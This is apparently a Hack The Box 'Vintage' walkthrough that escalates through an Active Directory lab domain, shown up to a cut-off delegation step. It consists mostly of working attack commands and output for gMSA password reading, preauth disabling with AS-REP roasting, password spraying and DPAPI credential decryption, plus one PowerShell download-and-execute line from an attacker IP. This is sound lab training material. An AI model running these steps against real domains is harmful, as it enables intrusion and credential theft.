As is common in real life Windows pentests, you will start the Vintage box with credentials for the following account: P.Rosa / Rosaisbest123

## HOST RECON

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49684/tcp open  unknown
53702/tcp open  unknown
53738/tcp open  unknown
```

#### login with winrm not work

```
└─$ evil-winrm -i 10.10.11.45 -u 'P.Rosa' -p 'Rosaisbest123'

...

Error: An error of type ArgumentError happened, message is unknown type: 2061232681
                                        
Error: Exiting with code 1
                             
```


#### I try verify creds but not work

```
└─$ crackmapexec smb 10.10.11.45 -u 'P.Rosa' -p 'Rosaisbest123' --shares
SMB         10.10.11.45     445    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False)
SMB         10.10.11.45     445    10.10.11.45      [-] 10.10.11.45\P.Rosa:Rosaisbest123 STATUS_NOT_SUPPORTED

```                                                                                                            

#### I went to the https://wadcoms.github.io/#+Password+Username and tried several options there but several of them returned this error "STATUS_NOT_SUPPORTED". I found some references saying that this error is related to NTLM support for user and password authentication (basically it wouldn't work).


#### Sync time with AD server and test if works

- https://community.spiceworks.com/t/possible-to-synchronize-ntp-on-a-linux-server-to-a-windows-domain-controller/91954/2

```
└─$ sudo rdate -u 10.10.11.45                                                             

```

#### After sync i can collect BH data

```
└─$ bloodhound-python --zip -c All -d vintage.htb -u 'P.Rosa' -p 'Rosaisbest123' -ns 10.10.11.45
INFO: Found AD domain: vintage.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.vintage.htb
INFO: Found 16 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.vintage.htb
INFO: Querying computer: dc01.vintage.htb
WARNING: Could not resolve: FS01.vintage.htb: The DNS query name does not exist: FS01.vintage.htb.
INFO: Done in 00M 36S
INFO: Compressing output into 20241212163115_bloodhound.zip
```


## Pass The Cache works too

- https://www.hackingarticles.in/lateral-movement-pass-the-ccache/

```
└─$ impacket-getTGT -dc-ip 10.10.11.45 vintage.htb/p.rosa:Rosaisbest123 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in p.rosa.ccache
```

```
└─$ export KRB5CCNAME=p.rosa.ccache
```

```
└─$ crackmapexec smb dc01.vintage.htb -d vintage.htb -u 'P.Rosa' --shares -k --use-kcache
SMB         dc01.vintage.htb 445    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01.vintage.htb [+] vintage.htb\ from ccache 
SMB         dc01.vintage.htb 445    dc01.vintage.htb [+] Enumerated shares
SMB         dc01.vintage.htb 445    dc01.vintage.htb Share           Permissions     Remark
SMB         dc01.vintage.htb 445    dc01.vintage.htb -----           -----------     ------
SMB         dc01.vintage.htb 445    dc01.vintage.htb ADMIN$                          Remote Admin
SMB         dc01.vintage.htb 445    dc01.vintage.htb C$                              Default share
SMB         dc01.vintage.htb 445    dc01.vintage.htb IPC$            READ            Remote IPC
SMB         dc01.vintage.htb 445    dc01.vintage.htb NETLOGON        READ            Logon server share 
SMB         dc01.vintage.htb 445    dc01.vintage.htb SYSVOL          READ            Logon server share 
```

```
└─$ netexec smb dc01.vintage.htb -d vintage.htb -u 'P.Rosa' -k --use-kcache --rid-brute

...

SMB         dc01.vintage.htb 445    dc01             1103: VINTAGE\DnsAdmins (SidTypeAlias)
SMB         dc01.vintage.htb 445    dc01             1104: VINTAGE\DnsUpdateProxy (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             1107: VINTAGE\gMSA01$ (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1108: VINTAGE\FS01$ (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1111: VINTAGE\M.Rossi (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1112: VINTAGE\R.Verdi (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1113: VINTAGE\L.Bianchi (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1114: VINTAGE\G.Viola (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1115: VINTAGE\C.Neri (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1116: VINTAGE\P.Rosa (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1120: VINTAGE\IT (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             1121: VINTAGE\HR (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             1122: VINTAGE\Finance (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             1123: VINTAGE\ServiceAccounts (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             1131: VINTAGE\DelegatedAdmins (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             1134: VINTAGE\svc_sql (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1135: VINTAGE\svc_ldap (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1136: VINTAGE\svc_ark (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1137: VINTAGE\ServiceManagers (SidTypeGroup)
SMB         dc01.vintage.htb 445    dc01             1140: VINTAGE\C.Neri_adm (SidTypeUser)
SMB         dc01.vintage.htb 445    dc01             1141: VINTAGE\L.Bianchi_adm (SidTypeUser)
```

## BloodHound data abuse path

## P.Rosa dont have outbound way

```
P.Rosa ---> Member of ---> Users, DomainUsers
|
|__ Inbound Object Control ---> L.Bianchi_admin ---> Members of ---> DomainAdmins ---> Owms ---> P.Rosa


L.Bianchi_adm ---> Member of ---> DomainAdmins 
```

## FS01

```
FS01.vintage.htb ---> Member of ---> DomainComputers ---> ReadGMSAPassword ---> GSMA01$@vintage.htb
								\_ Pre-Windows 2000 Compatible Access
```

#### Pre-Windows 2000 Compatible Access abuse

- https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/pre-created-computers-abuse

```
[23:34:31] INFO     VALID CREDENTIALS: vintage.htb\FS01$:fs01                                             
```

```
└─$ impacket-getTGT -dc-ip 10.10.11.45 vintage.htb/fs01$:fs01                                                                              
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in fs01$.ccache

...

└─$ export KRB5CCNAME=fs01\$.ccache  
```

#### ReadGMSAPassword abuse

- https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword

#### export fs01 ccache and read gmsa password

```
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -k get object "GMSA01$" --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
msDS-ManagedPassword.B64ENCODED: rbqGzqVFdvxykdQOfIBbURV60BZIq0uuTGQhrt7I1TyP2RA/oEHtUj9GrQGAFahc5XjLHb9RimLD5YXWsF5OiNgZ5SeBM+WrdQIkQPsnm/wZa/GKMx+m6zYXNknGo8teRnCxCinuh22f0Hi6pwpoycKKBWtXin4n8WQXF7gDyGG6l23O9mrmJCFNlGyQ2+75Z1C6DD0jp29nn6WoDq3nhWhv9BdZRkQ7nOkxDU0bFOOKYnSXWMM7SkaXA9S3TQPz86bV9BwYmB/6EfGJd2eHp5wijyIFG4/A+n7iHBfVFcZDN3LhvTKcnnBy5nihhtrMsYh2UMSSN9KEAVQBOAw12g==
```

## GSMA01

```
GSMA01$@vintage.htb ---> AddSelf and GeneriWrite ---> ServiceManager Group
```

- https://www.thehacker.recipes/ad/movement/dacl/addmember

```
└─$ impacket-getTGT -dc-ip dc01.vintage.htb vintage.htb/'GMSA01$' -hashes aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53 

└─$ export KRB5CCNAME=GMSA01\$.ccache 
```

#### After add GMAS01 to SERVICEMANGERS group request cache again with the new rights.

```
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb -u "GMSA01$" -k add groupMember "CN=SERVICEMANAGERS,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB" "GMSA01$"
[+] GMSA01$ added to CN=SERVICEMANAGERS,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB

└─$ rm GMSA01\$.ccache

└─$ impacket-getTGT -dc-ip dc01.vintage.htb vintage.htb/'GMSA01$' -hashes aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53
```

#### GMSA01$ successfuly added

```
└─$ netexec ldap dc01.vintage.htb -d vintage.htb -u 'GMSA01$' -H a317f224b45046c1446372c4dc06ae53 -k --query "(sAMAccountName=gmsa01$)" ""
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [+] vintage.htb\GMSA01$:a317f224b45046c1446372c4dc06ae53 
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [+] Response for object: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
LDAP        dc01.vintage.htb 389    dc01.vintage.htb objectClass:         top person organizationalPerson user computer msDS-GroupManagedServiceAccount
LDAP        dc01.vintage.htb 389    dc01.vintage.htb cn:                  gMSA01
LDAP        dc01.vintage.htb 389    dc01.vintage.htb distinguishedName:   CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
LDAP        dc01.vintage.htb 389    dc01.vintage.htb instanceType:        4
LDAP        dc01.vintage.htb 389    dc01.vintage.htb whenCreated:         20240605104148.0Z
LDAP        dc01.vintage.htb 389    dc01.vintage.htb whenChanged:         20241213173650.0Z
LDAP        dc01.vintage.htb 389    dc01.vintage.htb uSNCreated:          12773
LDAP        dc01.vintage.htb 389    dc01.vintage.htb memberOf:            CN=ServiceManagers,OU=Pre-Migration,DC=vintage,DC=htb     <------
LDAP        dc01.vintage.htb 389    dc01.vintage.htb uSNChanged:          114963
LDAP        dc01.vintage.htb 389    dc01.vintage.htb name:                gMSA01
LDAP        dc01.vintage.htb 389    dc01.vintage.htb objectGUID:          0x0de2e0f5aa910d4c82c2fd343c3ada0b
LDAP        dc01.vintage.htb 389    dc01.vintage.htb userAccountControl:  4096
```

## ServiceManagers Group

Distinguished Name:
CN=SERVICEMANAGERS,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB

```
ServiceManagers group ---> Members ---> C.Neri, G.Viola, L.Bianchi
								\___ GenericAll ---> SVC_LDAP, SVC_SQL, SVC_ARK
```

#### GenericAll on SERVICEMANAGERS group abuse

- https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/I%20-%20Domain%20Admin%20Privileges/README.md#kerberoasting
- https://www.rotta.rocks/active-directory/god-access/genericall-abuse#genericall-on-user
- https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/bloodyad#attacking-a-d-using-bloodyad (bloodyAD disable preauth)


#### Users with GenericAll over others can force disable pre-auth kerberos. Using GSMA01$ ccache with new rights disable preauth of svc_* users.

```
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb  -k add uac -f DONT_REQ_PREAUTH svc_sql  
[-] ['DONT_REQ_PREAUTH'] property flags added to svc_sql's userAccountControl
                                                                                                                                                                                             
┌──(vintage)─(kalibox㉿kalibox)-[~/Documents/Machines/htbVintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb  -k add uac -f DONT_REQ_PREAUTH svc_ldap
[-] ['DONT_REQ_PREAUTH'] property flags added to svc_ldap's userAccountControl
                                                                                                                                                                                             
┌──(vintage)─(kalibox㉿kalibox)-[~/Documents/Machines/htbVintage]
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb  -k add uac -f DONT_REQ_PREAUTH svc_ark 
[-] ['DONT_REQ_PREAUTH'] property flags added to svc_ark's userAccountControl
```

#### After this the svc_sql user preauth was not disabled, why it seems that the svc_sql user is disabled.

```
└─$ netexec ldap dc01.vintage.htb -d vintage.htb -u 'GMSA01$' -H a317f224b45046c1446372c4dc06ae53 -k --active-users                        
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [+] vintage.htb\GMSA01$:a317f224b45046c1446372c4dc06ae53 
LDAP        dc01.vintage.htb 389    dc01.vintage.htb [*] Total records returned: 11, total 3 user(s) disabled
LDAP        dc01.vintage.htb 389    dc01.vintage.htb -Username-                    -Last PW Set-       -BadPW- -Description-                                               
LDAP        dc01.vintage.htb 389    dc01.vintage.htb Administrator                 2024-06-08 11:34:54 0       Built-in account for administering the computer/domain      
LDAP        dc01.vintage.htb 389    dc01.vintage.htb M.Rossi                       2024-06-05 13:31:08 1                                                                   
LDAP        dc01.vintage.htb 389    dc01.vintage.htb R.Verdi                       2024-06-05 13:31:08 1                                                                   
LDAP        dc01.vintage.htb 389    dc01.vintage.htb L.Bianchi                     2024-06-05 13:31:08 1                                                                   
LDAP        dc01.vintage.htb 389    dc01.vintage.htb G.Viola                       2024-06-05 13:31:08 1                                                                   
LDAP        dc01.vintage.htb 389    dc01.vintage.htb C.Neri                        2024-06-05 21:08:13 0                                                                   
LDAP        dc01.vintage.htb 389    dc01.vintage.htb P.Rosa                        2024-11-06 12:27:16 0                                                                   
LDAP        dc01.vintage.htb 389    dc01.vintage.htb svc_ldap                      2024-06-06 13:45:27 0  <-----------                                                                 
LDAP        dc01.vintage.htb 389    dc01.vintage.htb svc_ark                       2024-06-06 13:45:27 0  <-----------                                                                 
LDAP        dc01.vintage.htb 389    dc01.vintage.htb C.Neri_adm                    2024-06-07 10:54:14 0                                                                   
LDAP        dc01.vintage.htb 389    dc01.vintage.htb L.Bianchi_adm                 2024-11-26 11:40:30 4
```

#### Enable svc_sql with GMSA01$ ccache rights and repeat disable preath.

- https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/bloodyad#attacking-a-d-using-bloodyad (disable ACCOUNTDISABLE)

```
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb  -k remove uac -f ACCOUNTDISABLE svc_sql
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl
```

```
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb  -k get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName

distinguishedName: CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_sql

distinguishedName: CN=svc_ldap,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ldap

distinguishedName: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb
sAMAccountName: svc_ark
```

#### ASREProast

```
└─$ impacket-GetNPUsers -dc-ip dc01.vintage.htb  'vintage.htb'/'GMSA01$' -k -no-pass -usersfile users.txt -outputfile preauth_hashes

...

$krb5asrep$23$svc_sql@VINTAGE.HTB:8f44f0b4bf86c8a41b5d06ae4fe454f8$425c7b4677983c3aa86cc76229afafa360e3981cc49e93b04919ab8cf9df76de079babb4171ecc6beb835ca36f3f6d36ea62baa34dccad472f121e241b8caf8c0923d4ce34058f73ad26dd341198dab4abbc999411b0325e84706b2c8c860080960f0af8328853d4bc5520cd6d1f3b763c91f156ed20c7ce118e2ea14ed63f16be5871f76f2baa6df93596c4956f450c56ea0a52746b189c858b96069742d898766c553481d58e289a687f5bf16cd9dc12318016fec84e9ce0bfb7d358d56906f61f657361e8eb9df6bbca0a138ea848345841799a8e8b40c6dc01688790d480057aec22009a11359bdb
$krb5asrep$23$svc_ldap@VINTAGE.HTB:180ee4580257f888998c99db5be84236$1650ec84fefb6a72c6815a94ac2eac1eccc804df1b1828aac68394c1a14b7441d6b2eaea6ceb7818290fb5ac1cadf1d65997fecd02ed3fd5cbb92c561b5d0ebcaa4328f8621b738a9a08de4bb049426459114f0e1c277a160976c366e6774092fbfd4a1fa410fc256bc6d2d2a2fb61cc57bd00646455557d9918d4210e74e11f8e858413e19028543949dd5421437f0eaa97461fc06579f8df96b407f8b3748e3e2e339b2a27c05953337bb3865896c0b708ee7edb3ae3825b26ccd8245be400e5d29e8ffcd41f58a3feeec26bf197d3a918f7df500187a1f23e4f38b296dbaf10cf83133b253c6124d8
$krb5asrep$23$svc_ark@VINTAGE.HTB:3e0102b419cdd90706c5895a000b6f45$d535d546f6eef6ef255e4edd8d7ce332d6b43e5627cb5a0eb2c42c3a5a193cf9ec77bce12727a4f57e2262ad43b677a82ffef7173029043f66a2466d52f048c5f9af956effe859317a63cd59addcb08c962c6ceb5e872d017c590fc56e30838a9323fbbae3d6a4c5ba3fef17f9c231e39cd7849f45616681fae55816e83fd89a4bcba19fbaef038b618a514910cd4f7f64c6d2e60b3f814c14e3f24153054f165d20543711456ddf479b9d790489852d2e229916801a939ba15e42d606d35a31549884fabefe5552fae3b343c4ccb1e3c84557a3d91b50ec23d29dad9d637482080fff7143cd1d295673
```

#### Crack hash

```
└─$ john preauth_hashes --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Zer0the0ne       ($krb5asrep$23$svc_sql@VINTAGE.HTB)  
```


## Password Spraying... C.Neri user has same password of svc_sql

```
└─$ netexec smb dc01.vintage.htb -d vintage.htb -u users.txt -p 'Zer0the0ne' -k --continue-on-success
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False)
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Guest:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\DC01$:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\gMSA01$:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\FS01$:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\C.Neri:Zer0the0ne 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_sql:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\svc_ldap account vulnerable to asreproast attack
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\svc_ark account vulnerable to asreproast attack
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED
```


#### Some problems with evil-winrm (ggggrrrrrr)

```
#### 1

Error: An error of type LoadError happened, message is cannot load such file -- ffi_c

SOLVE: └─$ sudo gem uninstall ffi && sudo gem install ffi --platform=ruby         

#### 2
Cannot find KDC for realm "VINTAGE.HTB"                                                                                                                                                      

SOLVE:

└─$ cat /etc/hosts
10.10.11.45 dc01 dc01.vintage.htb vintage.htb


└─$ cat /etc/krb5.conf
VINTAGE.HTB = {
                kdc = dc01.vintage.htb
}

└─$ evil-winrm -i dc01.vintage.htb -r vintage.htb                                 
```

## Login as C.Neri

```
*Evil-WinRM* PS C:\Users\C.Neri\Documents> whoami /all

USER INFORMATION
----------------

User Name      SID
============== ==============================================
vintage\c.neri S-1-5-21-4024337825-2033394866-2055507597-1115


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes
=========================================== ================ ============================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
VINTAGE\ServiceManagers                     Group            S-1-5-21-4024337825-2033394866-2055507597-1137 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
``` 


```
*Evil-WinRM* PS C:\Users> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : dc01
   Primary Dns Suffix  . . . . . . . : vintage.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : vintage.htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-94-CB-E5
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.10.11.45(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 127.0.0.1
                                       1.1.1.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

#### C.Neri machine has av enabled

```
*Evil-WinRM* PS C:\Users\C.Neri\Documents> iex(new-object net.webclient).downloadstring('http://10.10.14.183:8000/PowerView.ps1'); find-interestingdomainacl
At line:1 char:1
+ #requires -version 2
+ ~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At line:1 char:1
+ iex(new-object net.webclient).downloadstring('http://10.10.14.183:800 ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```


## Local PrivEsc with DPAPI (guesing gggrrrrr)

- https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords

#### 1 Getting user encrypted credentials ( commonly at C:\Users\$USER\AppData\{ Local or Roaming }\Microsoft\Credentials\


```
*Evil-WinRM* PS C:\Users\C.Neri\appdata\Roaming\Microsoft\Credentials> get-childitem -force


    Directory: C:\Users\C.Neri\appdata\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6



*Evil-WinRM* PS C:\Users\C.Neri\appdata\Roaming\Microsoft\Credentials> download C4BB96844A5C9DD45D5B6A9859252BA6

```

#### 2 Getting Master Key for decrypt user credentials, commonly at "C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID"


```
*Evil-WinRM* PS C:\Users\C.Neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> get-childitem -force


    Directory: C:\Users\C.Neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred



*Evil-WinRM* PS C:\Users\C.Neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b

```


#### 3 Getting decrypted master key

```
└─$ impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password 'Zer0the0ne' 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```

#### 4 decrypt user creds with master key

```
└─$ impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```

#### Check creds

```
└─$ netexec ldap 10.10.11.45 -u C.Neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k
LDAP        10.10.11.45     389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) (domain:vintage.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.45     389    dc01.vintage.htb [+] vintage.htb\C.Neri_adm:Uncr4ck4bl3P4ssW0rd0312
```

```
C.Neri_ADM ---> GenericWrite / AddSelf ---> DelegatedAdmins group
(c.neri_adm has addself but he is already part of delegatedadmins)

DelegatedAdmin group ---> Members ---> C.Neri_ADM, L.Binachi_ADM
```

## GenericWrite abuse

#### GenericWrite over group enable to abuse of Kerberos Constrained Delegation. "Using this a Domain admin can allow a computer to impersonate a user or computer against a service of a machine. Service for User to self (S4U2self): If a service account has a userAccountControl value containing TRUSTED_TO_AUTH_FOR_DELEGATION (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user."

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation
- https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse
- https://notes.morph3.blog/abusing-active-directory-acls/genericwrite#user-computer-has-genericwrite-over-computer


#### Try use svc_sql service account but not work because dont have suficient permissions, probably need use perms of c.neri_adm to add service account to a other group with more privilegies...

```
[*] Requesting S4U2self
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Probably user svc_sql does not have constrained delegation permisions or impersonated user does not exist
```

#### Adding svc_sql in DelegatedAdmins group (before need activate svc_sql account)

#### 1 - add svc_sql to group with c.neri_adm perms

```
└─$ bloodyAD --host dc01.vintage.htb -d vintage.htb  -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k add groupMember "delegatedadmins" svc_sql
[+] svc_sql added to delegatedadmins
```

#### 2 - set a new servicePrincipalName for svc_sql (c.neri perms works)

```
